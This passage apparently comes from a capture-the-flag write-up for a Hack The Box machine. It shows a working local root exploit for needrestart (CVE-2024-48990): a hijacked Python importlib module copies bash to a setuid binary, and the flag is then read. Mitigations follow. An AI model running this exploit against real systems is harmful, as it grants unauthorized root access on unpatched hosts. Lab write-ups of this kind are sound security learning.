Privilege Escalation – CVE-2024-48990 (needrestart 3.7)
sudo -l revealed:


(fismathack) NOPASSWD: /usr/sbin/needrestart

Pure Python importlib hijack (chosen after .so transfer issues):


# On target

mkdir -p /tmp/malicious/importlib

  

cat > /tmp/malicious/importlib/__init__.py << EOF

import os

os.setuid(0)

os.setgid(0)

os.system("cp /bin/bash /tmp/poc && chmod 4755 /tmp/poc")

EOF

  

cat > /tmp/malicious/bait.py << EOF

import time

while True:

    time.sleep(1)

EOF

  

cd /tmp/malicious

PYTHONPATH=/tmp/malicious python3 bait.py &

sudo needrestart

After ~15 seconds:


ls -l /tmp/poc

# -rwsr-xr-x 1 root root 1396520 Dec 13 01:05 /tmp/poc

Root shell:


/tmp/poc -p

whoami   # root

cat /root/root.txt

# htb{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}

Lessons Learned & Mitigations:
Web layer: Disable EXSLT extensions (XSLTAccessControl) and external entity processing in libxml2/lxml.

Credential hygiene: Never ship MD5 hashes in production databases.

Sudo hygiene: Avoid NOPASSWD on system utilities; enforce Defaults env_reset.

Dependency patching: needrestart ≥ 3.8 mitigates CVE-2024-48990.

Lab takeaway: Pure-Python __init__.py is more reliable than compiled .so for import hijacks when transfer/architecture issues arise.

